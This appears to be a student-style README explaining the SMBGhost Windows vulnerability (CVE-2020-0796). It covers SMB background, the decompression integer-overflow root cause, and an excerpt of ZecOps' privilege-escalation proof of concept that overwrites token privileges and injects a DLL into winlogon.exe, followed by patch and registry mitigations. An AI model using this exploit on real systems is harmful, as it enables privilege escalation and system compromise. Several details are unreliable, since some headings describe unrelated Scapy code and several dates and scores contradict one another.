# CVE-2020-0796


## Abstract
On March 12,2020, Microsoft confirmed that a critical vulnerability affecting the SMBv3 (Server Message Block 3.1.1) protocol associated with its latest version of Windows 10 and it has a case number: CVE-2020-0796. This is known as SMBGhosting in Windows 10 OS. 
-	date discovered: 2019-4-11 by Zecops Research Team
-	date patched: 2020-10-3 by Microsoft 

CVSSv3: 
-	base score: 10.0
-	Impact score: 0
-	Exploitability Score: 3.9
-	Severity: CRITICAL

Affected version: 
-	Windows 10 version (1903 and 1909)
-	Windows Server Version (1903 and 1909)


## Introduction
### What is SMB and what it does?
[Official defination](https://en.wikipedia.org/wiki/Server_Message_Block) In computer networking, Server Message Block, one version of which was also known as Common Internet File System (CFIS), is a communication protocol for providing shared access to files, printers and serial ports between nodes on a network. It also provides an authenticated inter-process communication (IPC) mechanism

This Protocol enables your devices to communciate with remote computers or servers. It basically lets you share files.

### What is SMBGhost and what it does? 
 This is a type of vulnerability that affects Windows 10 computers and was first reported publicly on 10 March, 2020. 
 
 This vulnerability allows the attacker to remotely execute the code on the SMB server or client. 



### who uses it and why would you want to use it
Users could be anyone among us. Here is a scenario, Imaging you are with your laptops, and using a printer connected to the company’s computer. When you request to print a document, your laptop uses the SMB protocol to send the print request to the company’s computer; while through the same protocol, your laptop will receive a response on whether the file is printed. 


### Real world impact
SMB version
-	SMBv1: released by IBM, Modified by Microsoft, (1990)
-	SMBv2: By Microsoft, Boosted performance
-	SMBv3: Increased Security

![download](https://user-images.githubusercontent.com/25041906/111921659-15191b00-8a6c-11eb-9c72-2afd91c12c3f.jpg)

The infamous WannaCry ransomware was an exploit of a vulnerability in SMB version one.
It infected hundreds of thousands of computers and encrypted their data. Users have to pay in Bitcoin to get their data back. 






## Vulnerability POC
The vulnerability exits because SMB does not handle the compressed network packets properly. In particular, the Srv2DecompressData function is called to decompress the packet, but it does not validate the original compressed size (originalCompressedSegmentSize + Offset) of the packet header. Therefore, a small amount of the additional memory for offset address is copied in the kernel memory. No surprisingly, the bug can be used to cause overflow to gain higher local privileges.
The below POC created by zecops research team illustrates how the bug can be exploited remotely without authentication by causing a blue screen of death.This is a simplified version of the function below



### Create a simple packet header 
Creating a network packet is one of the main features of Scapy. Initially, I will create a simplest header of a packet, which only contains source ip address and destination ip address. 


>>>                                               
typedef struct _COMPRESSION_TRANSFORM_HEADER
{
    ULONG ProtocolId;
    ULONG OriginalCompressedSegmentSize;
    USHORT CompressionAlgorithm;
    USHORT Flags;
    ULONG Offset;
} COMPRESSION_TRANSFORM_HEADER, *PCOMPRESSION_TRANSFORM_HEADER;
 
typedef struct _ALLOCATION_HEADER
{
    // ...
    PVOID UserBuffer;
    // ...
} ALLOCATION_HEADER, *PALLOCATION_HEADER;
 
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
{
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset),
        NULL);
    If (!Alloc) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
 
    ULONG FinalCompressedSize = 0;
 
    NTSTATUS Status = SmbCompressionDecompress(
        Header->CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header->Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header->Offset),
        (PUCHAR)Alloc->UserBuffer + Header->Offset,
        Header->OriginalCompressedSegmentSize,
        &FinalCompressedSize);
    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }
 
    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }
 
    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
}
>>>


By comparing line 20 (size + offet) and line 31 (size - offset), we can easily know that the buffer overflowed by executing this function. So If the offset is not zero, it triggers an additional integer overflow by three steps, allocate, decompress and copy. As a result, the memory allocation is shown in the picture below.

![Srv2DecompressData function](https://www.google.com/search?q=Srv2DecompressData&rlz=1C5CHFA_enCA919CA919&sxsrf=ALeKk03wKnRn0j00hxWl75aBvq5trvRMCQ:1616359135729&source=lnms&tbm=isch&sa=X&ved=2ahUKEwir7fSAn8LvAhWfGVkFHY8DBcMQ_AUoAnoECAEQBA&biw=1920&bih=976#imgrc=orKq2sACNF39NM&imgdii=lzwKxoCYwmreCM)


Whether or not the copy step is going to be executed, we already triggered the overflow since we changed the allocated size to be smaller than it actually needed. Thus, we are able to overflow any size of the content.
This could be a crucial vulnerability because we can use this to crash a specific windows system by an IP address.  The code below was created by ZECOPS research team, which customized a network packet header size and set up the offset in a token and exploit the vulnerability. The core part of the source code is shown as below.



### Send and receive packets (sr)
One of the most important segments in network is sending and receiving the packets. The sr() function is how we can implement them. The function will return both answered and unanswered packets. Below is a demonstration on how we use this function to send and receive a ICMP packets, as well as to decode the received the packets. 

>>> 
def exploit():
   """
   Exploits the bug to escalate privileges.
   Reminder:
   0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
      +0x000 Present          : Uint8B
      +0x008 Enabled          : Uint8B
      +0x010 EnabledByDefault : Uint8B
   """
   token = get_token_address()
   if token is None: sys.exit(-1)

   what = b'\xFF' * 8 * 3
   where = token + 0x40

   print('[+] Writing full privileges on address %x' % (where))

   write_what_where('127.0.0.1', what, where)

   print('[+] All done! Spawning a privileged shell.')
   print('[+] Check your privileges: !token %x' % (token))

   dll_path = pathlib.Path(__file__).parent.absolute().joinpath('spawn_cmd.dll')
   subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))

And when the SMB decompressed the header, it will crash the windows system at the beginning by bule screen of death as below.
![blue screen of death](https://en.wikipedia.org/wiki/Blue_screen_of_death#/media/File:Bsodwindows10.png)

But if we keep trying the exploit several times, we can get the system/authority privilege.

![get the root privilege](start.png)
![get the root privilege](end.png)

The whole stack buffer overflow source code refer to zecops research team at https://github.com/ZecOps/CVE-2020-0796-LPE-POC


### Mitigating SMB Ghosting Attacks
There are several entities and organizations at risk of this attack:
Small and large government entities, Large and small business entities, and home users.

#### There are 3 main methods of preventing SMB Ghosting Attacks
Method 1: Involves using the Windows Update program to install the new security updates or cumulative updates released in March 2020.
Method 2: Visiting the official Microsoft website to download the SMB Ghosting security patch which would be the service stack update KB4541338, cumulative update KB4551762.
Method 3: This is a workaround provided by Microsoft which is not a Recommended solution as it does not Prevent the Exploitation, It Just Disables the SMBv3 Compression.
Execute this command in PowerShell:
Command - Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force


### Conclusion 


### Resources
[ Security vuknerability ](https://en.wikipedia.org/wiki/SMBGhost_(security_vulnerability))
[ SMB protocol ](https://www.youtube.com/watch?v=csocwMe7l_E)
